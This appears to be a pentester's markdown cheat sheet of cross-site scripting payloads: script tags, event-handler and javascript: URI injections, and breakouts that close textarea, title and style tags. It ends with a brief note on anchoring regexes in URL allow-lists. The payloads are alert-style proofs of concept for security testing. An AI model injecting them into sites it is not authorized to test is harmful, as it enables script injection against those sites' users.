# Payloads for web applications

## XSS
- Level-wise
```bash
"><u>ashok # Check the HTML encoding
<script>alert(1)</script>
<script>alert(1);//</script>
<script>confirm(1);//</script>
<img src=x onerror=alert(1)>
<img src=x onmouseover=alert(1)>
<a href=javascript:alert(1)>test123
<iframe src=javascript:alert(1)>
<object data="data:text/html,<script>alert(1)</script>"></object>
<object%20data="data:text/html,<h1>Ash0k</h1>"></object>
<script src=data:text/javascript,alert(1337)></script>
</p>test123  | </p><h1>test123 | </p><h1><u>test123
text123"%20onmouseover=alert(1);// # First confirm with test123"> printing the special characters
test123;//"><img/src=x%20onerror=alert(2)></textarea><img/src=x%20onerror=alert(2)> # Text area tag must be closed </textarea>
"></textarea><ScRiPt>alert(1)</ScRiPt>
text123</title><script>alert(1)</script> # Title tag must be closed </title>
#fff);}</style><script>alert(1)</script><style>body{background-color:#   # Style sink close
text123%27;alert(1)// # Check the special characters like single or double quotes


```


## Best Practices
> Resources for Regex [Regular Expressions](https://regex101.com/)
- Here it can allow any website, it matches `In the TEST STRING, Instead of . we can place any single character`
![Regex](/Images/regex1.png)

- Here it should match `^ sign`, `In the TEST STRING, Instead of . we can place any single character`
![Regex](/Images/regex_Secured.png)
